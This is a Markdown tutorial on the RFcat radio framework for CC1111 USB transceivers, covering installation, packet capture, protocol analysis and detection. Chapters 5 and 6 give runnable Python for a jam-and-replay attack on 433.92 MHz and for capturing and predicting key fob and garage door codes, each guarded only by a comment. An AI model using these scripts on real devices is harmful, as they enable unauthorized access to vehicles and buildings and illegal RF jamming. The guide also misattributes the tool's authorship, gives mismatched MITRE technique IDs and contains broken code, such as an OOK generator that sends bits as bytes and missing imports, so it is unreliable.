---
tool_name: "rfcat"
display_name: "RFcat"
mitre_tactic: "reconnaissance"
mitre_tactic_id: "TA0043"
mitre_subcategory: "radio_frequency"
install_command: "sudo apt install rfcat"
version: "1.95"
github_repo: "https://github.com/greatscottgadgets/rfcat"
kali_tools_page: "https://www.kali.org/tools/rfcat/"
difficulty_level: "advanced"
requires_root: true
gui_available: false
tags: ["sdr", "rf", "radio", "reconnaissance", "protocol-analysis", "transceiver"]
related_tools: ["hackrf", "yerdos", "yard-stick-one", "rflib"]
---

# RFcat — RF Analysis and Manipulation Framework

## Chapter 1: Introduction & Overview

### What is RFcat?

RFcat is a Python-based radio frequency analysis framework designed for interacting with CC1111-based USB RF transceivers. Created by Michael Ossmann and maintained by Great Scott Gadgets, RFcat provides an interactive console and programmatic interface for low-level RF communication, protocol analysis, and security testing.

Unlike higher-level tools that abstract away radio details, RFcat gives users direct access to the CC1111 transceiver hardware, enabling precise control over frequency, modulation, power, and packet parameters. This makes it invaluable for reverse-engineering proprietary RF protocols and testing wireless device security.

### Key Features

- **Interactive Console** — IPython-based REPL with direct hardware access
- **DModem Abstraction** — High-level Python API for CC1111 register configuration
- **Direct Hardware Access** — Peek/poke CC1111 registers directly
- **Packet Abstraction** — TX/RX packet assembly and parsing
- **Extensible Architecture** — Custom modulation classes for non-standard schemes
- **Frequency Scanning** — Sweep bands to discover active transmitters
- **Modulation Analysis** — Identify and replicate modulation schemes

### Supported Devices

| Device | Chip | Interface | Notes |
|--------|------|-----------|-------|
| Yard Stick One | CC1111 | USB | Primary supported device |
| TI CC1111 Dongle | CC1111 | USB | Legacy support |
| TI CC1111EMK | CC1111 | USB | Evaluation module kit |

### Architecture

```
┌─────────────────────────────────────┐
│         RFcat Python API            │
│    (rfcat.DModem, rfcon classes)    │
├─────────────────────────────────────┤
│         USB Interface Layer         │
│      (pyusb/libusb transport)       │
├─────────────────────────────────────┤
│       CC1111 Firmware Layer         │
│    (RfCat firmware on device)       │
├─────────────────────────────────────┤
│         RF Transceiver              │
│    (Sub-1 GHz radio hardware)       │
└─────────────────────────────────────┘
```

### Frequency Ranges

The CC1111 transceiver operates across multiple frequency bands:

- **300-348 MHz**: Low band
- **378-464 MHz**: Mid-low band
- **779-928 MHz**: Mid-high band

Most consumer RF devices operate in the 315 MHz, 433 MHz, or 868/915 MHz bands.

### Modulation Types

```python
from rflib import *

# Amplitude Shift Keying / On-Off Keying
d.setMdmModulation(MOD_ASK_OOK)

# Gaussian Frequency Shift Keying
d.setMdmModulation(MOD_GFSK)

# Frequency Shift Keying
d.setMdmModulation(MOD_FSK)

# Minimum Shift Keying
d.setMdmModulation(MOD_MSK)
```

### MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Reconnaissance | Active Scanning: Wireless Spectrum Analysis | T1590.004 |
| Reconnaissance | Gather Victim Network Information | T1590 |
| Collection | Data from Wireless Capture | T1005 |

### Comparison with Other Tools

| Feature | RFcat | RTL-SDR | HackRF |
|---------|-------|---------|--------|
| TX Capability | Yes | No | Yes |
| Frequency Range | 300-928 MHz | 24 MHz - 1.7 GHz | 1 MHz - 6 GHz |
| Python API | Native | librtlsdr | libhackrf |
| Interactive Console | Yes | No | No |
| Packet Abstraction | Yes | No | Partial |
| Cost | ~$100 | ~$25 | ~$300 |

## Chapter 2: Installation & Setup

### System Requirements

- **OS**: Linux (Kali Linux recommended)
- **Hardware**: CC1111-based USB dongle or Yard Stick One
- **USB**: USB 2.0 port
- **Python**: 3.6+
- **Privileges**: Root access for USB device access

### Method 1: Package Manager

```bash
# Kali Linux
sudo apt update
sudo apt install rfcat

# Verify
rfcat --version
```

### Method 2: Install from Source

```bash
# Install dependencies
sudo apt install -y python3-dev python3-pip libusb-1.0-0-dev git

# Clone repository
git clone https://github.com/greatscottgadgets/rfcat.git
cd rfcat

# Install
sudo python3 setup.py install

# Or via pip
pip3 install .
```

### Method 3: pip Installation

```bash
pip3 install rfcat
```

### udev Rules

```bash
# Yard Stick One
sudo tee /etc/udev/rules.d/52-yardstick.rules << 'EOF'
SUBSYSTEM=="usb", ATTR{idVendor}=="1d50", ATTR{idProduct}=="6048", MODE="0666", GROUP="plugdev"
EOF

# CC1111 Dongle
sudo tee /etc/udev/rules.d/52-cc1111.rules << 'EOF'
SUBSYSTEM=="usb", ATTR{idVendor}=="0451", ATTR{idProduct}=="16a8", MODE="0666", GROUP="plugdev"
EOF

sudo udevadm control --reload-rules && sudo udevadm trigger
sudo usermod -a -G plugdev $USER
```

### Firmware Installation

RFcat requires specific firmware on the CC1111 device:

```bash
# Check device info
rfcat -r --list

# Flash RFcat firmware (if needed)
# Download from: https://github.com/greatscottgadgets/rfcat/tree/master/firmware

# Using GoodFET flasher
goodfet.cc1111 flash firmware.hex

# Or use built-in flasher
rfcat -r flash firmware.hex
```

### Verify Installation

```bash
# Launch interactive console
sudo rfcat -r

# Should see RFcat prompt
# >>> d = RfCat()
# >>> d.ping()
# True
```

### Uninstallation

```bash
pip3 uninstall rfcat
sudo rm -f /etc/udev/rules.d/52-yardstick.rules
sudo rm -f /etc/udev/rules.d/52-cc1111.rules
sudo udevadm control --reload-rules
```

## Chapter 3: Basic Usage

### Interactive Console

```bash
# Launch RFcat console
sudo rfcat -r

# With specific device index
sudo rfcat -r -i 0
```

### Basic Device Operations

```python
from rflib import *

# Connect to device
d = RfCat()

# Test connection
d.ping()
# True

# Get device info
d.getInfo()
# Firmware version, hardware info

# Set frequency (in Hz)
d.setFreq(433920000)  # 433.92 MHz

# Set modulation
d.setMdmModulation(MOD_ASK_OOK)

# Set data rate
d.setMdmDRate(4800)  # 4800 baud

# Set deviation
d.setMdmDeviatn(0)  # 0 Hz for ASK/OOK

# Set power amplifier
d.setPA(0x25)  # Power level

# Enter receive mode
d.setModeRX()

# Receive a packet
pkt = d.RFrecv(timeout=5000)  # 5 second timeout
print(pkt)

# Enter transmit mode and send
d.setModeTX()
d.RFxmit(b'\x01\x02\x03\x04')

# Return to idle
d.setModeIDLE()
```

### Direct Register Access

```python
# Read register
val = d.peek(0x00)

# Write register
d.poke(0x00, 0x01)

# Bulk read
data = d.peekX(addr, length)

# Bulk write
d.pokeX(addr, data, length)
```

### Basic Receive

```python
from rflib import *

d = RfCat()
d.setFreq(433920000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)
d.setMdmDeviatn(0)
d.setMdmNumPreamble(0)
d.setModeRX()

print("Listening for packets...")
for i in range(10):
    try:
        pkt = d.RFrecv(timeout=5000)
        print(f"Received: {pkt.data.hex()}")
        print(f"RSSI: {d.getRSSI()}")
    except ChipconUsbTimeoutException:
        print("Timeout - no packet received")
```

### Basic Transmit

```python
from rflib import *

d = RfCat()
d.setFreq(433920000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(4800)
d.setMdmDeviatn(0)
d.setPA(0x25)
d.setModeTX()

# Send packet
data = bytes([0xAA, 0x55, 0x01, 0x02, 0x03])
d.RFxmit(data)
print("Packet sent")
```

## Chapter 4: Intermediate Usage

### Frequency Scanning

```python
#!/usr/bin/env python3
"""rfcat_scanner.py - Frequency scanner using RFcat"""

from rflib import *
import time

def scan_frequencies(start_freq, end_freq, step=1000000, dwell=0.1):
    """Scan frequency range for signals"""
    d = RfCat()
    d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(4800)
    d.setMdmDeviatn(0)
    d.setModeRX()

    results = []
    freq = start_freq

    while freq <= end_freq:
        d.setFreq(freq)
        time.sleep(dwell)

        # Check for signal energy
        rssi = d.getRSSI()
        if rssi > -50:  # Threshold
            results.append({'frequency': freq, 'rssi': rssi})
            print(f"Signal at {freq/1e6:.3f} MHz: RSSI={rssi}")

        freq += step

    d.setModeIDLE()
    return results

# Scan 300-500 MHz
results = scan_frequencies(300000000, 500000000, 1000000, 0.05)
```

### Packet Analysis

```python
#!/usr/bin/env python3
"""Packet capture and analysis"""

from rflib import *
import time

def capture_packets(freq, duration=10, modulation=MOD_ASK_OOK):
    """Capture packets on specified frequency"""
    d = RfCat()
    d.setFreq(freq)
    d.setMdmModulation(modulation)
    d.setMdmDRate(4800)
    d.setMdmDeviatn(0)
    d.setModeRX()

    packets = []
    start = time.time()

    while time.time() - start < duration:
        try:
            pkt = d.RFrecv(timeout=1000)
            packets.append({
                'data': pkt.data,
                'rssi': d.getRSSI(),
                'timestamp': time.time()
            })
            print(f"Packet: {pkt.data.hex()} RSSI: {d.getRSSI()}")
        except ChipconUsbTimeoutException:
            continue

    d.setModeIDLE()
    return packets

# Capture at 433.92 MHz for 30 seconds
packets = capture_packets(433920000, 30)
print(f"Captured {len(packets)} packets")
```

### Signal Generation

```python
#!/usr/bin/env python3
"""Generate OOK signals"""

from rflib import *
import struct

def generate_ook_signal(data_bytes, bit_rate=4800, carrier_freq=433920000):
    """Generate OOK modulated signal from data bytes"""
    d = RfCat()
    d.setFreq(carrier_freq)
    d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(bit_rate)
    d.setMdmDeviatn(0)
    d.setPA(0x25)
    d.setModeTX()

    # Convert bytes to bits
    bits = []
    for byte in data_bytes:
        for i in range(8):
            bits.append((byte >> (7 - i)) & 1)

    # Create packet from bits
    packet = bytes(bits)
    d.RFxmit(packet)
    d.setModeIDLE()

# Send 0xAA55 pattern
generate_ook_signal(b'\xAA\x55')
```

### Protocol Reverse Engineering

```python
#!/usr/bin/env python3
"""Protocol reverse engineering workflow"""

from rflib import *
import numpy as np
from collections import Counter

class ProtocolAnalyzer:
    def __init__(self, freq, modulation=MOD_ASK_OOK, data_rate=4800):
        self.d = RfCat()
        self.d.setFreq(freq)
        self.d.setMdmModulation(modulation)
        self.d.setMdmDRate(data_rate)
        self.d.setMdmDeviatn(0)
        self.d.setModeRX()
        self.packets = []

    def capture(self, count=100, timeout=5000):
        """Capture multiple packets"""
        for i in range(count):
            try:
                pkt = self.d.RFrecv(timeout=timeout)
                self.packets.append(pkt.data)
                print(f"Packet {i+1}: {pkt.data.hex()}")
            except ChipconUsbTimeoutException:
                continue
        return self.packets

    def analyze_lengths(self):
        """Analyze packet length distribution"""
        lengths = [len(p) for p in self.packets]
        counter = Counter(lengths)
        print("Length distribution:")
        for length, count in sorted(counter.items()):
            print(f"  {length} bytes: {count} packets ({count/len(self.packets)*100:.1f}%)")

    def analyze_entropy(self):
        """Calculate packet entropy"""
        all_bytes = b''.join(self.packets)
        byte_counts = Counter(all_bytes)
        total = len(all_bytes)
        entropy = -sum((c/total) * np.log2(c/total) for c in byte_counts.values())
        print(f"Entropy: {entropy:.2f} bits/byte (max 8.0)")
        return entropy

    def find_repeated_patterns(self, min_length=2):
        """Find repeated byte patterns"""
        patterns = {}
        for pkt in self.packets:
            for length in range(min_length, len(pkt)):
                for start in range(len(pkt) - length + 1):
                    pattern = pkt[start:start+length]
                    patterns[pattern] = patterns.get(pattern, 0) + 1

        repeated = {p: c for p, c in patterns.items() if c > 2}
        for pattern, count in sorted(repeated.items(), key=lambda x: -x[1])[:10]:
            print(f"  {pattern.hex()}: {count} occurrences")

    def close(self):
        self.d.setModeIDLE()

# Usage
analyzer = ProtocolAnalyzer(433920000)
analyzer.capture(50)
analyzer.analyze_lengths()
analyzer.analyze_entropy()
analyzer.find_repeated_patterns()
analyzer.close()
```

## Chapter 5: Advanced Usage

### Custom Modulation Classes

```python
#!/usr/bin/env python3
"""Custom modulation implementation"""

from rflib import *

class CustomModulation:
    def __init__(self, device):
        self.d = device

    def setupManchester(self, bit_rate=4800):
        """Configure for Manchester encoding"""
        self.d.setMdmModulation(MOD_ASK_OOK)
        self.d.setMdmDRate(bit_rate * 2)  # Manchester doubles rate
        self.d.setMdmDeviatn(0)
        self.d.setMdmNumPreamble(8)
        self.d.setMdmSyncMode(0)  # No sync word

    def setupFSK2(self, deviation=50000, bit_rate=4800):
        """Configure for FSK2 modulation"""
        self.d.setMdmModulation(MOD_FSK)
        self.d.setMdmDRate(bit_rate)
        self.d.setMdmDeviatn(deviation)
        self.d.setMdmSyncMode(1)

    def setupGFSK(self, deviation=50000, bit_rate=4800):
        """Configure for GFSK modulation"""
        self.d.setMdmModulation(MOD_GFSK)
        self.d.setMdmDRate(bit_rate)
        self.d.setMdmDeviatn(deviation)
        self.d.setMdmSyncMode(1)

# Usage
d = RfCat()
mod = CustomModulation(d)
mod.setupManchester(4800)
d.setModeRX()
```

### Rolling Code Analysis

```python
#!/usr/bin/env python3
"""Analyze rolling code implementations"""

from rflib import *
import numpy as np

class RollingCodeAnalyzer:
    def __init__(self, freq, modulation=MOD_ASK_OOK):
        self.d = RfCat()
        self.d.setFreq(freq)
        self.d.setMdmModulation(modulation)
        self.d.setMdmDRate(4800)
        self.d.setMdmDeviatn(0)
        self.d.setModeRX()
        self.captured_codes = []

    def capture_button_presses(self, num_presses=10):
        """Capture codes from repeated button presses"""
        print("Press button on device...")
        for i in range(num_presses):
            try:
                pkt = self.d.RFrecv(timeout=10000)
                code = int.from_bytes(pkt.data, 'big')
                self.captured_codes.append(code)
                print(f"Code {i+1}: {code} (0x{code:08X})")
            except ChipconUsbTimeoutException:
                print(f"Timeout waiting for press {i+1}")

    def analyze_sequence(self):
        """Analyze captured code sequence"""
        if len(self.captured_codes) < 2:
            print("Need at least 2 codes")
            return

        differences = [self.captured_codes[i+1] - self.captured_codes[i]
                      for i in range(len(self.captured_codes)-1)]

        print(f"\nAnalysis:")
        print(f"  Codes: {self.captured_codes}")
        print(f"  Differences: {differences}")
        print(f"  Is sequential: {all(d == differences[0] for d in differences)}")
        print(f"  Average difference: {np.mean(differences):.1f}")

        # Predict next code
        avg_diff = np.mean(differences)
        predicted = self.captured_codes[-1] + int(round(avg_diff))
        print(f"  Predicted next code: {predicted} (0x{predicted:08X})")

    def close(self):
        self.d.setModeIDLE()

# Usage
analyzer = RollingCodeAnalyzer(433920000)
analyzer.capture_button_presses(10)
analyzer.analyze_sequence()
analyzer.close()
```

### Jam and Replay Testing

```python
#!/usr/bin/env python3
"""Jam and replay attack research"""
# FOR AUTHORIZED SECURITY TESTING ONLY

from rflib import *
import time

class JamReplayTester:
    def __init__(self, freq):
        self.freq = freq
        self.d = RfCat()

    def capture_signal(self, duration=5):
        """Capture signal while jamming"""
        self.d.setFreq(self.freq)
        self.d.setMdmModulation(MOD_ASK_OOK)
        self.d.setMdmDRate(4800)
        self.d.setMdmDeviatn(0)
        self.d.setModeRX()

        packets = []
        start = time.time()

        while time.time() - start < duration:
            try:
                pkt = self.d.RFrecv(timeout=1000)
                packets.append(pkt.data)
                print(f"Captured: {pkt.data.hex()}")
            except ChipconUsbTimeoutException:
                continue

        return packets

    def jam_and_capture(self, jam_duration=3, capture_duration=2):
        """Simulate jam+replay scenario"""
        print("Starting jamming...")
        self.d.setFreq(self.freq)
        self.d.setMdmModulation(MOD_ASK_OOK)
        self.d.setModeTX()

        # Send jamming signal
        jam_data = b'\xFF' * 1000
        for _ in range(int(jam_duration * 10)):
            self.d.RFxmit(jam_data)

        print("Stopping jammer, capturing...")
        self.d.setModeRX()

        packets = []
        start = time.time()
        while time.time() - start < capture_duration:
            try:
                pkt = self.d.RFrecv(timeout=1000)
                packets.append(pkt.data)
                print(f"Captured: {pkt.data.hex()}")
            except ChipconUsbTimeoutException:
                continue

        return packets

    def replay_signal(self, data):
        """Replay captured signal"""
        self.d.setFreq(self.freq)
        self.d.setMdmModulation(MOD_ASK_OOK)
        self.d.setMdmDRate(4800)
        self.d.setPA(0x25)
        self.d.setModeTX()
        self.d.RFxmit(data)
        self.d.setModeIDLE()
        print(f"Replayed: {data.hex()}")

    def close(self):
        self.d.setModeIDLE()

# Usage
tester = JamReplayTester(433920000)
packets = tester.jam_and_capture()
if packets:
    tester.replay_signal(packets[0])
tester.close()
```

### Integration with GNU Radio

```python
#!/usr/bin/env python3
"""RFcat + GNU Radio integration"""

from rflib import *
import subprocess
import numpy as np

class RFcatGNU:
    def __init__(self, freq):
        self.freq = freq
        self.d = RfCat()

    def capture_for_gnuradio(self, filename, duration=5):
        """Capture IQ data for GNU Radio analysis"""
        self.d.setFreq(self.freq)
        self.d.setMdmModulation(MOD_FSK)
        self.d.setMdmDRate(250000)
        self.d.setModeRX()

        samples = []
        start = time.time()
        sample_rate = 250000

        while time.time() - start < duration:
            try:
                pkt = self.d.RFrecv(timeout=100)
                samples.extend(pkt.data)
            except ChipconUsbTimeoutException:
                continue

        # Save as raw IQ
        data = np.array(samples, dtype=np.int8)
        data.tofile(filename)
        print(f"Saved {len(samples)} samples to {filename}")

    def close(self):
        self.d.setModeIDLE()

# Usage
rfcat_gnu = RFcatGNU(433920000)
rfcat_gnu.capture_for_gnuradio("capture.raw", 10)
rfcat_gnu.close()
```

## Chapter 6: Real-World Applications

### Garage Door Opener Research

```python
#!/usr/bin/env python3
"""Garage door opener protocol analysis"""
# FOR AUTHORIZED SECURITY TESTING ONLY

from rflib import *

def analyze_garage_door(freq=315000000):
    """Analyze garage door opener protocol"""
    d = RfCat()
    d.setFreq(freq)
    d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(300)  # Common rate for garage doors
    d.setMdmDeviatn(0)
    d.setModeRX()

    print("Press garage door button...")
    packets = []

    for i in range(5):
        try:
            pkt = d.RFrecv(timeout=10000)
            packets.append(pkt.data)
            print(f"Packet {i+1}: {pkt.data.hex()} ({len(pkt.data)} bytes)")
        except ChipconUsbTimeoutException:
            print(f"Timeout {i+1}")

    d.setModeIDLE()

    # Analyze
    if packets:
        print(f"\nAnalysis:")
        print(f"  Packet count: {len(packets)}")
        print(f"  Avg length: {np.mean([len(p) for p in packets]):.1f} bytes")
        print(f"  First byte: {packets[0][0]:02X}")

    return packets

# Usage
packets = analyze_garage_door(315000000)
```

### Wireless Sensor Monitoring

```python
#!/usr/bin/env python3
"""Monitor wireless sensors (temperature, humidity, etc.)"""

from rflib import *
import time

def monitor_sensors(freq=433920000, duration=300):
    """Monitor wireless sensor transmissions"""
    d = RfCat()
    d.setFreq(freq)
    d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(4800)
    d.setMdmDeviatn(0)
    d.setModeRX()

    readings = []
    start = time.time()

    while time.time() - start < duration:
        try:
            pkt = d.RFrecv(timeout=5000)
            readings.append({
                'data': pkt.data.hex(),
                'rssi': d.getRSSI(),
                'timestamp': time.time()
            })
            print(f"Sensor reading: {pkt.data.hex()} RSSI: {d.getRSSI()}")
        except ChipconUsbTimeoutException:
            continue

    d.setModeIDLE()
    return readings

# Monitor for 5 minutes
readings = monitor_sensors(433920000, 300)
print(f"Total readings: {len(readings)}")
```

### Key Fob Cloning Research

```python
#!/usr/bin/env python3
"""Key fob protocol research"""
# FOR AUTHORIZED SECURITY TESTING ONLY

from rflib import *

def research_keyfob(freq=433920000):
    """Research key fob protocol"""
    d = RfCat()
    d.setFreq(freq)
    d.setMdmModulation(MOD_ASK_OOK)
    d.setMdmDRate(4800)
    d.setMdmDeviatn(0)
    d.setModeRX()

    print("Press key fob button multiple times...")

    codes = []
    for i in range(10):
        try:
            pkt = d.RFrecv(timeout=5000)
            code = int.from_bytes(pkt.data, 'big')
            codes.append(code)
            print(f"Press {i+1}: Code={code} (0x{code:08X}) Data={pkt.data.hex()}")
        except ChipconUsbTimeoutException:
            print(f"Timeout {i+1}")

    d.setModeIDLE()

    if codes:
        # Check for rolling codes
        diffs = [codes[i+1] - codes[i] for i in range(len(codes)-1)]
        print(f"\nAnalysis:")
        print(f"  All same: {len(set(codes)) == 1}")
        if len(set(codes)) > 1:
            print(f"  Sequential: {all(d == diffs[0] for d in diffs)}")
            print(f"  Difference: {diffs[0]}")

    return codes

# Usage
codes = research_keyfob(433920000)
```

## Chapter 7: Detection & Defense

### Detecting RFcat Transmissions

**RF Fingerprinting:**

```python
import numpy as np

class RFcatDetector:
    def analyze_iq_data(self, iq_data, sample_rate=250000):
        """Detect RFcat/CC1111 transmission characteristics"""
        results = {'likely_rfcat': False, 'confidence': 0, 'indicators': []}

        # CC1111 has specific modulation artifacts
        # Check for OOK characteristics
        magnitude = np.abs(iq_data)
        threshold = np.mean(magnitude) * 0.5
        binary = (magnitude > threshold).astype(int)

        # Check timing patterns
        transitions = np.sum(np.abs(np.diff(binary)))
        transition_rate = transitions / len(iq_data) * sample_rate

        if 1000 < transition_rate < 10000:  # Typical OOK range
            results['indicators'].append('ook_timing')
            results['confidence'] += 0.3

        # Check for carrier characteristics
        fft_result = np.fft.fft(iq_data)
        power = np.abs(fft_result) ** 2
        peak = np.max(power) / np.sum(power)

        if peak > 0.1:  # Strong carrier
            results['indicators'].append('strong_carrier')
            results['confidence'] += 0.2

        results['likely_rfcat'] = results['confidence'] > 0.4
        return results
```

### RF Security Best Practices

1. **Encryption**: Always encrypt sensitive RF communications
2. **Rolling Codes**: Implement rolling code schemes for access control
3. **Challenge-Response**: Use challenge-response authentication
4. **Frequency Hopping**: Employ spread spectrum techniques
5. **Signal Analysis**: Regularly audit RF emissions

### Counter-Surveillance

- Monitor 315 MHz, 433 MHz, 868 MHz, 915 MHz bands for unauthorized transmissions
- Use spectrum analysis to detect unexpected signals
- Deploy RF shielding in sensitive areas

### Incident Response

1. Detect unauthorized RF transmissions
2. Capture and analyze suspicious signals
3. Identify source and protocol
4. Implement countermeasures
5. Document findings

## Chapter 8: Troubleshooting & Resources

### Common Errors

**"No devices found"**
```bash
# Check USB connection
lsusb | grep -i "1d50\|0451"

# Check udev rules
ls -la /etc/udev/rules.d/*rfcat*
ls -la /etc/udev/rules.d/*cc1111*
ls -la /etc/udev/rules.d/*yardstick*

# Reload rules
sudo udevadm control --reload-rules
sudo udevadm trigger
```

**"Permission denied"**
```bash
# Run with sudo
sudo rfcat -r

# Add user to plugdev group
sudo usermod -a -G plugdev $USER
```

**"Device not responding"**
```bash
# Check firmware version
rfcat -r --list

# Re-flash firmware
# Download from: https://github.com/greatscottgadgets/rfcat
```

**"ImportError: No module named rflib"**
```bash
# Install rflib
pip3 install rflib
# Or from source
cd rfcat && sudo python3 setup.py install
```

### FAQ

**Q: What's the difference between RFcat and HackRF?**
A: RFcat is designed for sub-1 GHz protocol analysis with packet abstraction. HackRF is a general-purpose SDR covering 1 MHz - 6 GHz with raw I/Q capabilities.

**Q: Can RFcat transmit?**
A: Yes, RFcat can transmit on the CC1111's supported frequency bands (300-928 MHz).

**Q: What protocols can RFcat analyze?**
A: Any protocol using ASK/OOK, FSK, GFSK, or MSK modulation in the CC1111's frequency range. Common: garage doors, key fobs, wireless sensors, IoT devices.

**Q: Is RFcat legal to use?**
A: RFcat hardware is legal to own. Transmitting requires authorization for the target frequency band. Use only on systems you own or have permission to test.

### Resources

- **GitHub**: https://github.com/greatscottgadgets/rfcat
- **Documentation**: https://github.com/greatscottgadgets/rfcat/wiki
- **Great Scott Gadgets**: https://greatscottgadgets.com
- **Yard Stick One**: https://greatscottgadgets.com/yardstick-one/
- **Michael Ossmann's Talks**: DEF CON, CCC presentations on RF security
- **Osmocom Projects**: https://osmocom.org

### Legal Considerations

RFcat is a powerful tool for authorized security testing. Always obtain proper authorization before testing RF protocols. Unauthorized interception and transmission may violate computer crime and telecommunications laws.
